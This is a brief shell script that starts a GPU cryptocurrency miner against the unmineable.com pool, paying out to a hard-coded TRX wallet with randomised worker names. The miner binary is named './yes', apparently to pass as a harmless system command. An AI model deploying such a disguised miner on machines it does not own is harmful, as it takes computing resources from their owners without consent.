POOL=rx-us.unmineable.com:3333
WALLET=TRX:TL3TCWQXJiozBM3hZVhg2BiPh4NsbgzHpm
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 7GD8fHhe-$(shuf -i 1911-849869 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
